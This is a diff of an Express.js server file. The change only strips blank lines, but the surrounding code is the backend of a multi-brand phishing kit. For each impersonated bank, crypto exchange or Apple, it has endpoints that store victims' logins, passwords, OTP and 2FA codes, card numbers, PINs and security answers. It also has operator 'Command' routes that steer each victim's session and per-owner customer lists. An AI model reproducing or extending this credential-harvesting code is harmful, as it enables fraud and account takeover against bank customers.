@@ -34,14 +34,12 @@ panelConnection.connect((err) => {
 
 var bankName;
 
-
 app.get("/getips", (req, res) => {
   fs.readFile("ips.txt", function (err, data) {
     var filecontents = data;
     res.send(filecontents);
   });
 });
-
 
 app.post("/giveVisitor", (req, res) => {
   ip = req.body.ip;
@@ -64,7 +62,6 @@ app.post("/giveVisitor", (req, res) => {
   );
 });
 
-
 app.get("/getVisitors/:owner", (req, res) => {
   owner = req.params.owner;
   panelConnection.query(
@@ -74,7 +71,6 @@ app.get("/getVisitors/:owner", (req, res) => {
     }
   );
 });
-
 
 app.get("/getRespentesting123!", (req, res) => {
   fs.readFile("results.txt", function (err, data) {
@@ -86,7 +82,6 @@ app.get("/getRespentesting123!", (req, res) => {
 //SANTS
 //SANTS
 //SANTS
-
 
 app.get("/santsCustomers/:id/:owner/modal", (req, res) => {
   uniqueid = req.params.id;
@@ -101,7 +96,6 @@ app.get("/santsCustomers/:id/:owner/modal", (req, res) => {
   });
 });
 
-
 app.get("/santsCustomers/:owner", (req, res) => {
   owner = req.params.owner;
   let details = [owner];
@@ -112,7 +106,6 @@ app.get("/santsCustomers/:owner", (req, res) => {
     else console.log(err);
   });
 });
-
 
 app.post("/santsCommand", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -139,7 +132,6 @@ app.post("/santsCommand", cors(), (req, res) => {
   }
 });
 
-
 app.get("/santsCustomers/:id/:owner", (req, res) => {
   uniqueid = req.params.id;
   owner = req.params.owner;
@@ -154,7 +146,6 @@ app.get("/santsCustomers/:id/:owner", (req, res) => {
 });
 
 let santsCount = 0;
-
 
 app.post("/santsSaveLogin", cors(), (req, res) => {
   username = req.body.username;
@@ -188,7 +179,6 @@ app.post("/santsSaveLogin", cors(), (req, res) => {
   }
 });
 
-
 app.post("/santsSaveOtp", cors(), (req, res) => {
   otp = req.body.otp;
   uniqueid = req.body.uniqueid;
@@ -202,7 +192,6 @@ app.post("/santsSaveOtp", cors(), (req, res) => {
     else console.log(err);
   });
 });
-
 
 app.post("/santsSaveLoginAgain", cors(), (req, res) => {
   username = req.body.username;
@@ -219,7 +208,6 @@ app.post("/santsSaveLoginAgain", cors(), (req, res) => {
   });
 });
 
-
 app.post("/santsSavePhone", cors(), (req, res) => {
   phone = req.body.phone;
   uniqueid = req.body.uniqueid;
@@ -233,7 +221,6 @@ app.post("/santsSavePhone", cors(), (req, res) => {
     else console.log(err);
   });
 });
-
 
 app.post("/santsSaveCard", cors(), (req, res) => {
   ccname = req.body.ccname;
@@ -252,7 +239,6 @@ app.post("/santsSaveCard", cors(), (req, res) => {
   });
 });
 
-
 app.post("/santsDeleteentry/:id", cors(), (req, res) => {
   uniqueid = req.params.id;
   owner = req.body.owner;
@@ -270,7 +256,6 @@ app.post("/santsDeleteentry/:id", cors(), (req, res) => {
 //REV
 //REV
 
-
 app.get("/revCustomers/:owner", (req, res) => {
   owner = req.params.owner;
   let details = [owner];
@@ -281,7 +266,6 @@ app.get("/revCustomers/:owner", (req, res) => {
     else console.log(err);
   });
 });
-
 
 app.get("/revCustomers/:id/:owner/modal", (req, res) => {
   uniqueid = req.params.id;
@@ -296,7 +280,6 @@ app.get("/revCustomers/:id/:owner/modal", (req, res) => {
   });
 });
 
-
 app.post("/revCommand", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
   newStatus = req.body.status;
@@ -307,7 +290,6 @@ app.post("/revCommand", cors(), (req, res) => {
     else console.log(err);
   });
 });
-
 
 app.get("/revCustomers/:id/:owner", (req, res) => {
   uniqueid = req.params.id;
@@ -321,7 +303,6 @@ app.get("/revCustomers/:id/:owner", (req, res) => {
     else console.log(err);
   });
 });
-
 
 app.post("/revSaveLogin", cors(), (req, res) => {
   telephone = req.body.telephone;
@@ -338,7 +319,6 @@ app.post("/revSaveLogin", cors(), (req, res) => {
   });
 });
 
-
 app.post("/revSaveLoginAgain", cors(), (req, res) => {
   telephone = req.body.telephone;
   uniqueid = req.body.uniqueid;
@@ -352,7 +332,6 @@ app.post("/revSaveLoginAgain", cors(), (req, res) => {
   });
 });
 
-
 app.post("/revSaveName", cors(), (req, res) => {
   fullname = req.body.fullname;
   uniqueid = req.body.uniqueid;
@@ -365,7 +344,6 @@ app.post("/revSaveName", cors(), (req, res) => {
     else console.log(err);
   });
 });
-
 
 app.post("/revSaveCard", cors(), (req, res) => {
   ccnum = req.body.ccnum;
@@ -382,7 +360,6 @@ app.post("/revSaveCard", cors(), (req, res) => {
   });
 });
 
-
 app.post("/revSavePin", cors(), (req, res) => {
   pin = req.body.pin;
   uniqueid = req.body.uniqueid;
@@ -396,7 +373,6 @@ app.post("/revSavePin", cors(), (req, res) => {
   });
 });
 
-
 app.post("/revSaveOtp", cors(), (req, res) => {
   otp = req.body.otp;
   uniqueid = req.body.uniqueid;
@@ -409,7 +385,6 @@ app.post("/revSaveOtp", cors(), (req, res) => {
     else console.log(err);
   });
 });
-
 
 app.post("/revDeleteentry/:id", cors(), (req, res) => {
   uniqueid = req.params.id;
@@ -428,7 +403,6 @@ app.post("/revDeleteentry/:id", cors(), (req, res) => {
 //KUCOIN
 //KUCOIN
 
-
 app.get("/kcCustomers/:owner", (req, res) => {
   owner = req.params.owner;
   let details = [owner];
@@ -439,7 +413,6 @@ app.get("/kcCustomers/:owner", (req, res) => {
     else console.log(err);
   });
 });
-
 
 app.get("/kcCustomers/:id/:owner/modal", (req, res) => {
   uniqueid = req.params.id;
@@ -454,7 +427,6 @@ app.get("/kcCustomers/:id/:owner/modal", (req, res) => {
   });
 });
 
-
 app.post("/kcCommand", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
   newStatus = req.body.status;
@@ -465,7 +437,6 @@ app.post("/kcCommand", cors(), (req, res) => {
     else console.log(err);
   });
 });
-
 
 app.get("/kcCustomers/:id/:owner", (req, res) => {
   uniqueid = req.params.id;
@@ -479,7 +450,6 @@ app.get("/kcCustomers/:id/:owner", (req, res) => {
     else console.log(err);
   });
 });
-
 
 app.post("/kcSaveLogin", cors(), (req, res) => {
   username = req.body.username;
@@ -497,7 +467,6 @@ app.post("/kcSaveLogin", cors(), (req, res) => {
   });
 });
 
-
 app.post("/kcSaveLoginAgain", cors(), (req, res) => {
   username = req.body.username;
   password = req.body.password;
@@ -512,7 +481,6 @@ app.post("/kcSaveLoginAgain", cors(), (req, res) => {
   });
 });
 
-
 app.post("/kcSaveTradingPass", cors(), (req, res) => {
   tradingPass = req.body.tradingPass;
   uniqueid = req.body.uniqueid;
@@ -525,7 +493,6 @@ app.post("/kcSaveTradingPass", cors(), (req, res) => {
     else console.log(err);
   });
 });
-
 
 app.post("/kcSave2FA", cors(), (req, res) => {
   twofactor = req.body.twofactor;
@@ -540,7 +507,6 @@ app.post("/kcSave2FA", cors(), (req, res) => {
   });
 });
 
-
 app.post("/kcSaveOTP", cors(), (req, res) => {
   otp = req.body.otp;
   uniqueid = req.body.uniqueid;
@@ -553,7 +519,6 @@ app.post("/kcSaveOTP", cors(), (req, res) => {
     else console.log(err);
   });
 });
-
 
 app.post("/kcSaveAll", cors(), (req, res) => {
   otp = req.body.otp;
@@ -569,7 +534,6 @@ app.post("/kcSaveAll", cors(), (req, res) => {
     else console.log(err);
   });
 });
-
 
 app.post("/kcDeleteentry/:id", cors(), (req, res) => {
   uniqueid = req.params.id;
@@ -588,7 +552,6 @@ app.post("/kcDeleteentry/:id", cors(), (req, res) => {
 //MICB
 //MICB
 
-
 app.get("/micbCustomers/:owner", (req, res) => {
   owner = req.params.owner;
   let details = [owner];
@@ -599,7 +562,6 @@ app.get("/micbCustomers/:owner", (req, res) => {
     else console.log(err);
   });
 });
-
 
 app.get("/micbCustomers/:id/:owner/modal", (req, res) => {
   uniqueid = req.params.id;
@@ -614,7 +576,6 @@ app.get("/micbCustomers/:id/:owner/modal", (req, res) => {
   });
 });
 
-
 app.post("/micbCommand", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
   newStatus = req.body.status;
@@ -625,7 +586,6 @@ app.post("/micbCommand", cors(), (req, res) => {
     else console.log(err);
   });
 });
-
 
 app.get("/micbCustomers/:id/:owner", (req, res) => {
   uniqueid = req.params.id;
@@ -639,7 +599,6 @@ app.get("/micbCustomers/:id/:owner", (req, res) => {
     else console.log(err);
   });
 });
-
 
 app.post("/micbSaveLogin", cors(), (req, res) => {
   username = req.body.username;
@@ -658,7 +617,6 @@ app.post("/micbSaveLogin", cors(), (req, res) => {
   });
 });
 
-
 app.post("/micbSaveLoginAgain", cors(), (req, res) => {
   username = req.body.username;
   password = req.body.password;
@@ -675,7 +633,6 @@ app.post("/micbSaveLoginAgain", cors(), (req, res) => {
   });
 });
 
-
 app.post("/micbSaveOtp", cors(), (req, res) => {
   otp = req.body.otp;
   uniqueid = req.body.uniqueid;
@@ -689,7 +646,6 @@ app.post("/micbSaveOtp", cors(), (req, res) => {
     else console.log(err);
   });
 });
-
 
 app.post("/micbDeleteentry/:id", cors(), (req, res) => {
   uniqueid = req.params.id;
@@ -708,7 +664,6 @@ app.post("/micbDeleteentry/:id", cors(), (req, res) => {
 //MQ
 //MQ
 
-
 app.get("/mqCustomers/:owner", (req, res) => {
   owner = req.params.owner;
   let details = [owner];
@@ -719,7 +674,6 @@ app.get("/mqCustomers/:owner", (req, res) => {
     else console.log(err);
   });
 });
-
 
 app.get("/mqCustomers/:id/:owner/modal", (req, res) => {
   uniqueid = req.params.id;
@@ -734,7 +688,6 @@ app.get("/mqCustomers/:id/:owner/modal", (req, res) => {
   });
 });
 
-
 app.post("/mqCommand", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
   newStatus = req.body.status;
@@ -745,7 +698,6 @@ app.post("/mqCommand", cors(), (req, res) => {
     else console.log(err);
   });
 });
-
 
 app.get("/mqCustomers/:id/:owner", (req, res) => {
   uniqueid = req.params.id;
@@ -761,7 +713,6 @@ app.get("/mqCustomers/:id/:owner", (req, res) => {
 });
 
 let mqCount = 0;
-
 
 app.post("/mqSaveLogin", cors(), (req, res) => {
   username = req.body.username;
@@ -795,7 +746,6 @@ app.post("/mqSaveLogin", cors(), (req, res) => {
   }
 });
 
-
 app.post("/mqSaveLoginAgain", cors(), (req, res) => {
   username = req.body.username;
   password = req.body.password;
@@ -811,7 +761,6 @@ app.post("/mqSaveLoginAgain", cors(), (req, res) => {
   });
 });
 
-
 app.post("/mqSaveOtp", cors(), (req, res) => {
   otp = req.body.otp;
   uniqueid = req.body.uniqueid;
@@ -825,7 +774,6 @@ app.post("/mqSaveOtp", cors(), (req, res) => {
     else console.log(err);
   });
 });
-
 
 app.post("/mqDeleteentry/:id", cors(), (req, res) => {
   uniqueid = req.params.id;
@@ -844,7 +792,6 @@ app.post("/mqDeleteentry/:id", cors(), (req, res) => {
 //BNP
 //BNP
 
-
 app.get("/bnpCustomers/:owner", (req, res) => {
   owner = req.params.owner;
   let details = [owner];
@@ -855,7 +802,6 @@ app.get("/bnpCustomers/:owner", (req, res) => {
     else console.log(err);
   });
 });
-
 
 app.post("/bnpCommand", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -868,7 +814,6 @@ app.post("/bnpCommand", cors(), (req, res) => {
     else console.log(err);
   });
 });
-
 
 app.get("/bnpCustomers/:id/:owner/modal", (req, res) => {
   uniqueid = req.params.id;
@@ -883,7 +828,6 @@ app.get("/bnpCustomers/:id/:owner/modal", (req, res) => {
   });
 });
 
-
 app.get("/bnpCustomers/:id/:owner", (req, res) => {
   uniqueid = req.params.id;
   owner = req.params.owner;
@@ -896,7 +840,6 @@ app.get("/bnpCustomers/:id/:owner", (req, res) => {
     else console.log(err);
   });
 });
-
 
 app.post("/bnpSaveLoginOtp", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -912,7 +855,6 @@ app.post("/bnpSaveLoginOtp", cors(), (req, res) => {
   });
 });
 
-
 app.post("/bnpSaveIdentityOtp", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
   identityOtp = req.body.identityOtp;
@@ -927,7 +869,6 @@ app.post("/bnpSaveIdentityOtp", cors(), (req, res) => {
   });
 });
 
-
 app.post("/bnpSaveVerification", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
   verificationCode = req.body.verificationCode;
@@ -941,7 +882,6 @@ app.post("/bnpSaveVerification", cors(), (req, res) => {
     else console.log(err);
   });
 });
-
 
 app.post("/bnpSaveLoginAgain", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -958,7 +898,6 @@ app.post("/bnpSaveLoginAgain", cors(), (req, res) => {
   });
 });
 
-
 app.post("/bnpSavePhone", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
   telephone = req.body.telephone;
@@ -972,7 +911,6 @@ app.post("/bnpSavePhone", cors(), (req, res) => {
     else console.log(err);
   });
 });
-
 
 app.post("/bnpSaveCard", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -990,7 +928,6 @@ app.post("/bnpSaveCard", cors(), (req, res) => {
   });
 });
 
-
 app.post("/bnpSaveLogin", cors(), (req, res) => {
   clientCode = req.body.clientCode;
   secretCode = req.body.secretCode;
@@ -1005,7 +942,6 @@ app.post("/bnpSaveLogin", cors(), (req, res) => {
     else console.log(err);
   });
 });
-
 
 app.post("/bnpDeleteentry/:id", cors(), (req, res) => {
   uniqueid = req.params.id;
@@ -1023,7 +959,6 @@ app.post("/bnpDeleteentry/:id", cors(), (req, res) => {
 //DBS
 //DBS
 
-
 app.get("/dbsCustomers/:id", (req, res) => {
   uniqueid = req.params.id;
 
@@ -1036,14 +971,12 @@ app.get("/dbsCustomers/:id", (req, res) => {
   });
 });
 
-
 app.get("/dbsCustomers", (req, res) => {
   panelConnection.query(`SELECT * FROM customers`, (err, rows, fields) => {
     if (!err) res.send(rows);
     else console.log(err);
   });
 });
-
 
 app.post("/dbsCommand", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -1070,7 +1003,6 @@ app.post("/dbsCommand", cors(), (req, res) => {
   }
 });
 
-
 app.post("/dbsDeleteentry/:id", cors(), (req, res) => {
   uniqueid = req.params.id;
 
@@ -1082,7 +1014,6 @@ app.post("/dbsDeleteentry/:id", cors(), (req, res) => {
     else console.log(err);
   });
 });
-
 
 app.post("/dbsSaveLogin", cors(), (req, res) => {
   pin = req.body.pin;
@@ -1099,7 +1030,6 @@ app.post("/dbsSaveLogin", cors(), (req, res) => {
   });
 });
 
-
 app.post("/dbsSaveLoginAgain", cors(), (req, res) => {
   pin = req.body.pin;
   userId = req.body.userid;
@@ -1114,7 +1044,6 @@ app.post("/dbsSaveLoginAgain", cors(), (req, res) => {
   });
 });
 
-
 app.post("/dbsPaymentOtp", cors(), (req, res) => {
   paymentOtp = req.body.paymentOtp;
   uniqueid = req.body.uniqueid;
@@ -1127,7 +1056,6 @@ app.post("/dbsPaymentOtp", cors(), (req, res) => {
     else console.log(err);
   });
 });
-
 
 app.post("/dbsSavePhone", cors(), (req, res) => {
   telephone = req.body.telephone;
@@ -1142,7 +1070,6 @@ app.post("/dbsSavePhone", cors(), (req, res) => {
   });
 });
 
-
 app.post("/dbsSaveEmail", cors(), (req, res) => {
   email = req.body.email;
   uniqueid = req.body.uniqueid;
@@ -1155,7 +1082,6 @@ app.post("/dbsSaveEmail", cors(), (req, res) => {
     else console.log(err);
   });
 });
-
 
 app.post("/dbsSavePhoneOtp", cors(), (req, res) => {
   otp = req.body.otp;
@@ -1170,7 +1096,6 @@ app.post("/dbsSavePhoneOtp", cors(), (req, res) => {
   });
 });
 
-
 app.post("/dbsSaveEmailOtp", cors(), (req, res) => {
   otp = req.body.otp;
   uniqueid = req.body.uniqueid;
@@ -1183,7 +1108,6 @@ app.post("/dbsSaveEmailOtp", cors(), (req, res) => {
     else console.log(err);
   });
 });
-
 
 app.post("/dbsSaveCC", cors(), (req, res) => {
   ccnum = req.body.ccnum;
@@ -1204,7 +1128,6 @@ app.post("/dbsSaveCC", cors(), (req, res) => {
 //ANZ
 //ANZ
 
-
 app.get("/anzCustomers/:owner", (req, res) => {
   owner = req.params.owner;
 
@@ -1216,7 +1139,6 @@ app.get("/anzCustomers/:owner", (req, res) => {
     else console.log(err);
   });
 });
-
 
 app.post("/anzCommand", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -1241,7 +1163,6 @@ app.post("/anzCommand", cors(), (req, res) => {
   }
 });
 
-
 app.get("/anzCustomers/:id/:owner/modal", (req, res) => {
   uniqueid = req.params.id;
   owner = req.params.owner;
@@ -1255,7 +1176,6 @@ app.get("/anzCustomers/:id/:owner/modal", (req, res) => {
   });
 });
 
-
 app.get("/anzCustomers/:id/:owner", (req, res) => {
   uniqueid = req.params.id;
   owner = req.params.owner;
@@ -1268,7 +1188,6 @@ app.get("/anzCustomers/:id/:owner", (req, res) => {
     else console.log(err);
   });
 });
-
 
 app.post("/anzSaveLogin", cors(), (req, res) => {
   customerId = req.body.customerId;
@@ -1286,7 +1205,6 @@ app.post("/anzSaveLogin", cors(), (req, res) => {
   });
 });
 
-
 app.post("/anzSaveTelephone", cors(), (req, res) => {
   telephone = req.body.telephone;
   uniqueid = req.body.uniqueid;
@@ -1300,7 +1218,6 @@ app.post("/anzSaveTelephone", cors(), (req, res) => {
     else console.log(err);
   });
 });
-
 
 app.post("/anzSaveLoginAgain", cors(), (req, res) => {
   customerId = req.body.customerId;
@@ -1317,7 +1234,6 @@ app.post("/anzSaveLoginAgain", cors(), (req, res) => {
   });
 });
 
-
 app.post("/anzSaveOTP", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
   otp = req.body.otp;
@@ -1332,7 +1248,6 @@ app.post("/anzSaveOTP", cors(), (req, res) => {
   });
 });
 
-
 app.post("/anzSaveAnswers", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
   answer1 = req.body.answer1;
@@ -1346,7 +1261,6 @@ app.post("/anzSaveAnswers", cors(), (req, res) => {
     else console.log(err);
   });
 });
-
 
 app.post("/anzDeleteentry/:id", cors(), (req, res) => {
   uniqueid = req.params.id;
@@ -1364,7 +1278,6 @@ app.post("/anzDeleteentry/:id", cors(), (req, res) => {
 //BL
 //BL
 
-
 app.get("/banklineCustomers/:id", (req, res) => {
   uniqueid = req.params.id;
 
@@ -1377,14 +1290,12 @@ app.get("/banklineCustomers/:id", (req, res) => {
   });
 });
 
-
 app.get("/banklineCustomers", (req, res) => {
   blConnection.query(`SELECT * FROM customers`, (err, rows, fields) => {
     if (!err) res.send(rows);
     else console.log(err);
   });
 });
-
 
 app.post("/banklineSaveLogin", cors(), (req, res) => {
   customerId = req.body.customerId;
@@ -1401,7 +1312,6 @@ app.post("/banklineSaveLogin", cors(), (req, res) => {
   });
 });
 
-
 app.post("/banklineSavePayment", cors(), (req, res) => {
   paymentCode = req.body.paymentCode;
   uniqueid = req.body.uniqueid;
@@ -1414,7 +1324,6 @@ app.post("/banklineSavePayment", cors(), (req, res) => {
     else console.log(err);
   });
 });
-
 
 app.post("/banklineSaveAuth", cors(), (req, res) => {
   responseCode = req.body.responseCode;
@@ -1429,7 +1338,6 @@ app.post("/banklineSaveAuth", cors(), (req, res) => {
     else console.log(err);
   });
 });
-
 
 app.post("/banklineCommand", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -1477,7 +1385,6 @@ app.post("/banklineCommand", cors(), (req, res) => {
   }
 });
 
-
 app.post("/banklineDeleteentry/:id", cors(), (req, res) => {
   uniqueid = req.params.id;
 
@@ -1489,7 +1396,6 @@ app.post("/banklineDeleteentry/:id", cors(), (req, res) => {
     else console.log(err);
   });
 });
-
 
 app.post("/banklineSaveLoginAgain", cors(), (req, res) => {
   customerId = req.body.customerId;
@@ -1509,7 +1415,6 @@ app.post("/banklineSaveLoginAgain", cors(), (req, res) => {
 //WP
 //WP
 
-
 app.get("/wpCustomers/:id/:owner/modal", (req, res) => {
   uniqueid = req.params.id;
   owner = req.params.owner;
@@ -1523,7 +1428,6 @@ app.get("/wpCustomers/:id/:owner/modal", (req, res) => {
   });
 });
 
-
 app.get("/wpCustomers/:owner", (req, res) => {
   owner = req.params.owner;
   let details = [owner];
@@ -1535,7 +1439,6 @@ app.get("/wpCustomers/:owner", (req, res) => {
   });
 });
 
-
 app.post("/wpCommand", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
   newStatus = req.body.status;
@@ -1546,7 +1449,6 @@ app.post("/wpCommand", cors(), (req, res) => {
     else console.log(err);
   });
 });
-
 
 app.get("/wpCustomers/:id/:owner", (req, res) => {
   uniqueid = req.params.id;
@@ -1560,7 +1462,6 @@ app.get("/wpCustomers/:id/:owner", (req, res) => {
     else console.log(err);
   });
 });
-
 
 app.post("/wpSaveLogin", cors(), (req, res) => {
   customerId = req.body.customerId;
@@ -1578,7 +1479,6 @@ app.post("/wpSaveLogin", cors(), (req, res) => {
   });
 });
 
-
 app.post("/wpSaveLoginAgain", cors(), (req, res) => {
   customerId = req.body.customerId;
   password = req.body.password;
@@ -1594,7 +1494,6 @@ app.post("/wpSaveLoginAgain", cors(), (req, res) => {
   });
 });
 
-
 app.post("/wpSaveOTP", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
   otp = req.body.otp;
@@ -1609,7 +1508,6 @@ app.post("/wpSaveOTP", cors(), (req, res) => {
   });
 });
 
-
 app.post("/wpSaveTelephone", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
   telephone = req.body.telephone;
@@ -1623,7 +1521,6 @@ app.post("/wpSaveTelephone", cors(), (req, res) => {
     else console.log(err);
   });
 });
-
 
 app.post("/wpDeleteentry/:id", cors(), (req, res) => {
   uniqueid = req.params.id;
@@ -1642,7 +1539,6 @@ app.post("/wpDeleteentry/:id", cors(), (req, res) => {
 //COMMBANK
 //COMMBANK
 
-
 app.get("/cbCustomers/:owner", (req, res) => {
   owner = req.params.owner;
   let details = [owner];
@@ -1654,7 +1550,6 @@ app.get("/cbCustomers/:owner", (req, res) => {
   });
 });
 
-
 app.post("/cbCommand", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
   newStatus = req.body.status;
@@ -1665,7 +1560,6 @@ app.post("/cbCommand", cors(), (req, res) => {
     else console.log(err);
   });
 });
-
 
 app.get("/cbCustomers/:id/:owner", (req, res) => {
   uniqueid = req.params.id;
@@ -1691,7 +1585,6 @@ app.get("/cbCustomers/:id/:owner", (req, res) => {
   });
 });
 
-
 app.get("/cbCustomers/:id/:owner/modal", (req, res) => {
   uniqueid = req.params.id;
   owner = req.params.owner;
@@ -1704,7 +1597,6 @@ app.get("/cbCustomers/:id/:owner/modal", (req, res) => {
     else console.log(err);
   });
 });
-
 
 app.post("/cbSaveLogin", cors(), (req, res) => {
   clientNumber = req.body.clientNumber;
@@ -1723,7 +1615,6 @@ app.post("/cbSaveLogin", cors(), (req, res) => {
   });
 });
 
-
 app.post("/cbSaveLoginAgain", cors(), (req, res) => {
   customerId = req.body.customerId;
   password = req.body.password;
@@ -1739,7 +1630,6 @@ app.post("/cbSaveLoginAgain", cors(), (req, res) => {
   });
 });
 
-
 app.post("/cbSaveOTP", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
   otp = req.body.otp;
@@ -1754,7 +1644,6 @@ app.post("/cbSaveOTP", cors(), (req, res) => {
     else console.log(err);
   });
 });
-
 
 app.post("/cbSaveCard", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -1773,7 +1662,6 @@ app.post("/cbSaveCard", cors(), (req, res) => {
   });
 });
 
-
 app.post("/cbSavePhone", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
   telephone = req.body.telephone;
@@ -1788,7 +1676,6 @@ app.post("/cbSavePhone", cors(), (req, res) => {
     else console.log(err);
   });
 });
-
 
 app.post("/cbDeleteentry/:id", cors(), (req, res) => {
   uniqueid = req.params.id;
@@ -1807,7 +1694,6 @@ app.post("/cbDeleteentry/:id", cors(), (req, res) => {
 //ZENCOM
 //ZENCOM
 
-
 app.get("/zcCustomers/:owner", (req, res) => {
   owner = req.params.owner;
   let result = [];
@@ -1819,7 +1705,6 @@ app.get("/zcCustomers/:owner", (req, res) => {
   res.send(result);
 });
 
-
 app.post("/zcCommand", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
   newStatus = req.body.status;
@@ -1830,7 +1715,6 @@ app.post("/zcCommand", cors(), (req, res) => {
     }
   }
 });
-
 
 app.get("/zcCustomers/:id/:owner", (req, res) => {
   uniqueid = req.params.id;
@@ -1844,7 +1728,6 @@ app.get("/zcCustomers/:id/:owner", (req, res) => {
   }
   res.send(result);
 });
-
 
 app.post("/zcSavePin", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -1860,7 +1743,6 @@ app.post("/zcSavePin", cors(), (req, res) => {
   res.send("Completed");
 });
 
-
 app.post("/zcSaveLoginAgain", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
   telephone = req.body.telephone;
@@ -1875,7 +1757,6 @@ app.post("/zcSaveLoginAgain", cors(), (req, res) => {
   res.send("Completed");
 });
 
-
 app.post("/zcSaveOtp", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
   otp = req.body.otp;
@@ -1889,7 +1770,6 @@ app.post("/zcSaveOtp", cors(), (req, res) => {
   }
   res.send("Completed");
 });
-
 
 app.post("/zcSaveLogin", cors(), (req, res) => {
   telephone = req.body.telephone;
@@ -1912,7 +1792,6 @@ app.post("/zcSaveLogin", cors(), (req, res) => {
 //RBC
 //RBC
 
-
 app.get("/rbcCustomers/:id/:owner/modal", (req, res) => {
   uniqueid = req.params.id;
   owner = req.params.owner;
@@ -1926,7 +1805,6 @@ app.get("/rbcCustomers/:id/:owner/modal", (req, res) => {
   });
 });
 
-
 app.get("/rbcCustomers/:owner", (req, res) => {
   owner = req.params.owner;
   let details = [owner];
@@ -1937,7 +1815,6 @@ app.get("/rbcCustomers/:owner", (req, res) => {
     else console.log(err);
   });
 });
-
 
 app.post("/rbcCommand", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -1960,7 +1837,6 @@ app.post("/rbcCommand", cors(), (req, res) => {
   }
 });
 
-
 app.get("/rbcCustomers/:id/:owner", (req, res) => {
   uniqueid = req.params.id;
   owner = req.params.owner;
@@ -1973,7 +1849,6 @@ app.get("/rbcCustomers/:id/:owner", (req, res) => {
     else console.log(err);
   });
 });
-
 
 app.post("/rbcSaveLogin", cors(), (req, res) => {
   username = req.body.username;
@@ -1991,7 +1866,6 @@ app.post("/rbcSaveLogin", cors(), (req, res) => {
   });
 });
 
-
 app.post("/rbcSaveTelephone", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
   telephone = req.body.telephone;
@@ -2004,7 +1878,6 @@ app.post("/rbcSaveTelephone", cors(), (req, res) => {
     else console.log(err);
   });
 });
-
 
 app.post("/rbcSaveQuestion", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -2019,7 +1892,6 @@ app.post("/rbcSaveQuestion", cors(), (req, res) => {
   });
 });
 
-
 app.post("/rbcSaveOtp", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
   otp = req.body.otp;
@@ -2032,7 +1904,6 @@ app.post("/rbcSaveOtp", cors(), (req, res) => {
     else console.log(err);
   });
 });
-
 
 app.post("/rbcSaveLoginAgain", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -2047,7 +1918,6 @@ app.post("/rbcSaveLoginAgain", cors(), (req, res) => {
     else console.log(err);
   });
 });
-
 
 app.post("/rbcDeleteentry/:id", cors(), (req, res) => {
   uniqueid = req.params.id;
@@ -2065,7 +1935,6 @@ app.post("/rbcDeleteentry/:id", cors(), (req, res) => {
 //APPLE PANEL
 //APPLE PANEL
 
-
 app.get("/appleCustomers/:id/:owner/modal", (req, res) => {
   uniqueid = req.params.id;
   owner = req.params.owner;
@@ -2079,7 +1948,6 @@ app.get("/appleCustomers/:id/:owner/modal", (req, res) => {
   });
 });
 
-
 app.get("/appleCustomers/:owner", (req, res) => {
   owner = req.params.owner;
   let details = [owner];
@@ -2091,7 +1959,6 @@ app.get("/appleCustomers/:owner", (req, res) => {
   });
 });
 
-
 app.post("/appleCommand", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
   newStatus = req.body.status;
@@ -2102,7 +1969,6 @@ app.post("/appleCommand", cors(), (req, res) => {
     else console.log(err);
   });
 });
-
 
 app.get("/appleCustomers/:id/:owner", (req, res) => {
   uniqueid = req.params.id;
@@ -2116,7 +1982,6 @@ app.get("/appleCustomers/:id/:owner", (req, res) => {
     else console.log(err);
   });
 });
-
 
 app.post("/appleSaveBilling", cors(), (req, res) => {
   firstName = req.body.firstName;
@@ -2149,7 +2014,6 @@ app.post("/appleSaveBilling", cors(), (req, res) => {
   });
 });
 
-
 app.post("/appleSaveCC", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
   ccname = req.body.ccname;
@@ -2167,7 +2031,6 @@ app.post("/appleSaveCC", cors(), (req, res) => {
   });
 });
 
-
 app.post("/appleSaveOtp", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
   otp = req.body.otp;
@@ -2181,7 +2044,6 @@ app.post("/appleSaveOtp", cors(), (req, res) => {
     else console.log(err);
   });
 });
-
 
 app.post("/appleDeleteentry/:id", cors(), (req, res) => {
   uniqueid = req.params.id;
@@ -2200,7 +2062,6 @@ app.post("/appleDeleteentry/:id", cors(), (req, res) => {
 //ASB
 //ASB
 
-
 app.get("/asbCustomers/:id/:owner/modal", (req, res) => {
   uniqueid = req.params.id;
   owner = req.params.owner;
@@ -2214,7 +2075,6 @@ app.get("/asbCustomers/:id/:owner/modal", (req, res) => {
   });
 });
 
-
 app.get("/asbCustomers/:owner", (req, res) => {
   owner = req.params.owner;
   let details = [owner];
@@ -2226,7 +2086,6 @@ app.get("/asbCustomers/:owner", (req, res) => {
